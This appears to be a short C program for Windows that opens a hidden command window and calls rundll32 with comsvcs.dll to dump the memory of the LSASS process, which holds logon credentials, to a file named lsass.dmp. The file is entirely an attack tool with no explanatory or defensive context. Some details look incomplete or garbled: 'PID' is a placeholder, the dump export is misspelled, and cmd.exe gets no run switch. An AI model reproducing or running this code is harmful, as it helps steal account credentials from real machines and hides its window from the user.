#include <windows.h>

#define RUN(to_run) ShellExecuteA(NULL,"open","cmd.exe",to_run ,NULL,SW_HIDE);

int main() {
    RUN("rundll32.exe C:\\Windows\\System32\\comsvcs.dll Mini_Dump PID lsass.dmp full");
    return 0;
}